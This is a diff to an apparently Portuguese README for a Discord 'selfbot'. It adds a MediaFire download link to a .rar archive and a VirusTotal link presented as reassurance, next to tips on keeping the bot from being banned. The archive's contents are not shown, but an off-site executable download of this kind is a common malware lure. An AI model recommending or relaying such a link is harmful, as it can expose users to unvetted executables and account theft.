@@ -14,3 +14,15 @@ Conceitos básicos
 2- O bot deve estar no servidor.<p>
 3- Para que seu bot não caia rapidamente utilize um que a mais tempo de criação como 1 mês por ai.<p>
 4- Lembre-se de ativar "Privileged Gateway Intents" na pagina do discord developer
+
+
+💸 <b>• DOWNLOAD : https://www.mediafire.com/file/m13cozv4xkl5usu/Lofy-SelfBot-V4.rar/file
+
+💸 <b>• VIRUSTOTAL-SCAN : https://www.virustotal.com/gui/file/5b90b134f4fdbfaf2b94b9fdfb5193ed3dc0a3b1e6602e9ab0441acb52590674?nocache=1
+
+![5197f7c4-6b28-4252-9ddd-ab170b5a70a7](https://user-images.githubusercontent.com/113463089/191509200-043d5aaf-7dfc-4ace-9719-9f155cdcf297.jpg)
+
+
+
+
+
